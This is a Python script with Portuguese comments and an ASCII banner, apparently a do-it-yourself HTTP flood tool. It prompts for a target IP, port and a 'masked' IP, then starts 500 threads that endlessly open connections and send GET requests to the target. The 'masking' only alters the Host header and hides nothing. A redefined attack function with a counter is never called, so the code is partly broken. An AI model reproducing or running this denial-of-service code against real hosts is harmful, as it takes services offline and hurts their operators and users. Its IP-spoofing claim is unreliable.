import socket
import threading
import time
import random

# Impressão do design ASCII
print('┏━┓┈┈╭━━━━╮┏━┓┈┈')
print('┃╱┃┈┈┃╱╭╮╱┃┃╱┃┈┈')
print('┃╱┗━┓┃╱┃┃╱┃┃╱┗━┓')
print('┃╱╱╱┃┃╱╰╯╱┃┃╱╱╱┃')
print('┗━━━┛╰━━━━╯┗━━━┛')

# Solicitação de entrada do usuário
target = input('Insira o IP de destino: ')
fake_ip = input('Insira seu IP mascarado ou digite R para escolher aleatoriamente: ')
port = int(input('Insira a porta: '))  # Certifique-se de converter a porta em um número inteiro

if fake_ip.lower() == 'r':
    # Gerar um IP mascarado aleatório
    fake_ip = f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    print(f"IP mascarado aleatório gerado: {fake_ip}")

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()
